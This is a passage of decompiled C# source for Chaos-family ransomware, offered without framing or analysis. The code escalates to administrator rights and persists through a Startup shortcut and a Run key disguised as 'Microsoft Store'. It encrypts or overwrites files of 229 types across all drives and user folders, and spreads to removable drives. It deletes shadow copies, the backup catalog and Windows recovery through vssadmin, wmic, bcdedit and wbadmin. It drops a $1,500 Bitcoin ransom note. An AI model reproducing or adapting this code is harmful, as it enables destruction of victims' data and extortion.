EeUb0HV31DTDFDqB2uIuT8x1rrXEldZU6g4NxVIj4veDyMHlRbaRIa+mG5gGxIyL4UE9K5u+gMHvOdJurJAYOh3IDr7y2/RavcKo2AQEBRgMFRc/i2zJO5qicSmq2FMRBWZIa1cA1Wz51VSRqBUEBHFsz32QMJt6xOQOW9Ztc+cx1y3hIa8MOybmlycH4mdScpzcuGAYtuD3LjeK2QCNFx8iHjzmr8YqhrkjUMaxqE8it22cbTER/NcXl7ulgAMrPhe2579t4+IGaUvcQxkLJQQAYmEwQCd48qTaWuyJ+hw7Z6F2ZQZ1nZOZXcRjXFh+2ZuIcuQE750QxBA1wdyJ6QM0SxbAAIUAgAFtUsLhMFHtzlc/TPnQhbUFlEmQJBIykiLiHyOYqXuQMPnwm5EZQmBcHTzpYdypV/A8nx1fWV5MzASm6r60Y4dxDLBthAPjK5hhjNozjPKs93VyokwMFjE+QJH4+dHNwk6UIEpJAggGROg8sdOtCVtKgBhGYP8Np3D9DSbQ7ZbDcMwWwq5i4h6BsjWp12il3CmVPd3UnInmjjlNVbdpOTBIEg7YKHnUtMkfD/D1yUn9TFDuuVjEbwDnT/cPSkqa83D67XYaDBiQTKqpzAL7gxz89poNTUVCouXMVAR3I+o/Ooq04PqPzqk0stBQ2wqsV1dVIhQjooi7H5fjXV1EoNAmKCjW7xWcAg8iJGNq6uog4mDHSuMb9pR8QBEeIwbjvGBa+wB931NAuQqqryZcyFIPaPIABecRsRXV1ess/g+7/ANmrXF3L+Ygfm288nrszBhXT4nVjqBy4jQScdmg3OPwqicRjvM4aZYZ1ufhAPIV1dUtospIIx+esm3OIoSgEMaulunzaLuRD6iZkG5o2PS0D5UtfAJJZcxJOcYhEQczsK6urbQ4V+726mMRJjX7ffoIXYuoAJ7s+Gee8HpRluBiYBMzcMxLEeBPSurqS+xabIu1h5AUjaMEZ47xMsAA0Rl3MhOndoloQW2aLkrJjW4G0RmPlkV1dVaJraryMdwO8Oby86v01oYrqGjWOSuAIM9o5OZiIirvEBSRpJsoucRjWf511dQIXIOMBxeVagRy0MS2ZG5pxJIJg/budwCAVQdwEDfNAZxpnf3aPojuSXydG2341NdRLWWU2v/yIFI/Tw7we3ALLkgOBG8IQMZ+EGaACmiJOns3QjG4MoY6mprqFSmN39XRoNKHxy6vFyymSGIY6LkERoKeIknl/nViVxlkIuQIg99xMz9jy866urQpw+/1PfJugjLRISW3ekH7TXGokkLGo5KXLWwLfZgAAbQBFKcTxax3CQSRcAj92+dcHmDXV1D4i0KAAMfYV9BjsLJKiXw+a+zFdDMw7SdjAECYE6RyBNGUwBpaBHaKTtsodLkfKurq4DZVrnjgPV97QKjtJB6YRzNHdUSM45m2/O2eg2igPdksoALbFpiQDuRtPnXV1YsmWpbvdUsI2zAmcviItrGNOQIaP3gOsQfNK7UGDgiIgtozMGJAO3nXV1cQxbCfQGjvOEo0F3NYQK84EEncchIcbbcmrONTXVD4hTqapgGvd4qswwipqprq6pTDhFiDBPKQJ5ZDwPuP0NDrq6lmOBd4//9k=";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "ransomware3535@gmail.com", "Payment informationAmount: 0.0990 BTC", "Bitcoin Address:  0xcb7dbbe31fbc053ca0b519aa0f0a2d63d6367322", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>r3RHpvgl4I1y+wuEtroMRi4nObhgQDUxc90ooqQrGo09y5WDgz58/Hfn+z6RVfdY8B8ipggQdyiuo60MDWf+fpqkVuay6KrIWeit86GG3cdvEVek9nHsRbi0BWUMTKWzxN7udytcwemGZePIcFkby2PIlM1WsOsQ4wksvMkQ+jU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
